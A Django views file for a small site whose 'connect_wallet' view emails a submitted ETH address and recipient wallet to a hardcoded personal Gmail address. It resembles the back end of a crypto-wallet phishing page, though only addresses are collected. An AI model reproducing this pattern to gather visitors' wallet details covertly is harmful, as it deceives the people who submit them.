from django.shortcuts import render,get_object_or_404, redirect
from django.urls import reverse
from django.http import JsonResponse
from django.contrib.auth import logout as auth_logout,login as auth_login,authenticate
from django.core.mail import send_mail


def empty(request):
    return render(request,'page.html')

def home(request):
    return render(request,'index.html')

def about_us(request):
    return render(request,'about.html')

def donate(request):
    return render(request,'about.html')



def connect_wallet(request):
    if request.method == "POST":
        eth_address = request.POST.get("eth_address")
        recipient_wallet = request.POST.get("recipient_wallet")

        if not eth_address or not recipient_wallet:
            return JsonResponse({"success": False, "error": "Missing required fields."}, status=400)

        subject = "New Wallet Connection Request"
        message = (
            f"New Wallet Connection Details:\n\n"
            f"ETH Address: {eth_address}\n"
            f"Recipient Wallet: {recipient_wallet}\n"
        )
        # jotop147@gmail.com
        recipient_email = "yakubudestiny9@gmail.com"

        try:
            send_mail(
                subject,
                message,
                None,  # uses DEFAULT_FROM_EMAIL from settings
                [recipient_email],
            )
            return JsonResponse({"success": True, "message": "Email sent successfully."})
        except Exception as e:
            print("Email error:", e)
            return JsonResponse({"success": False, "error": "Email sending failed."}, status=500)

    return JsonResponse({"success": False, "error": "Invalid request method."}, status=405)